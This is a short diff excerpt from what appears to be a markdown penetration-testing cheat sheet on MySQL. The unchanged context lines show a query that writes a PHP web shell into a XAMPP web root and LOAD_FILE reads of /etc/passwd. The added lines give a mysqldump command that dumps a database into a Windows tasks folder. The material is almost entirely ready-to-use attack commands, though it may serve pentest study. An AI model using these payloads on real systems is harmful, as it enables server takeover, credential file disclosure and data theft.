@@ -42,3 +42,10 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\cmd.php
 SELECT LOAD_FILE("/etc/passwd");
 SELECT LOAD_FILE("C:\\xampp\\htdocs\\cmd.php");
 ```
+
+### Mysqldump.exe
+
+```bash
+mysqldump.exe -u <username> -p<password> <dbname > c\windows\tasks\backup.sql
+```
+
